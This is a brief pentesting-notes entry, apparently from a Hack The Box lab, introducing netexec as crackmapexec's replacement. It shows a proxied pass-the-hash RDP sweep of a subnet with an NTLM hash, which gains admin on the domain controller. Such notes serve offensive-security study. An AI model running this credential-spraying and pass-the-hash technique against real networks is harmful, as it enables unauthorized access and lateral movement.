
### netexec
- new and improved `crackmapexec` due to being deprecated, works with all protocols as before except now also properly works with rdp
```bash
┌──(root💀gobots)-[21Jun2024 20:03:54]-[/home/kali/SUT/Alchemy]                                                                                                                                       
└─# proxychains netexec rdp 172.16.0.0/24 -u "james" -H C9B30A86ACAEA990BF9FA6C35AC9DD92 -d alchemy.htb                                                                                                                         
RDP         172.16.0.33     3389   WS02             [*] Windows 10 or Windows Server 2016 Build 19041 (name:WS02) (domain:alchemy.htb) (nla:True)                                                     
RDP         172.16.0.2      3389   DC               [*] Windows 8.1 or Windows Server 2012 R2 Build 9600 (name:DC) (domain:alchemy.htb) (nla:True)
RDP         172.16.0.33     3389   WS02             [-] alchemy.htb\james:C9B30A86ACAEA990BF9FA6C35AC9DD92 (STATUS_LOGON_FAILURE)
RDP         172.16.0.2      3389   DC               [+] alchemy.htb\james:C9B30A86ACAEA990BF9FA6C35AC9DD92 (Pwn3d!)
Running nxc against 256 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
```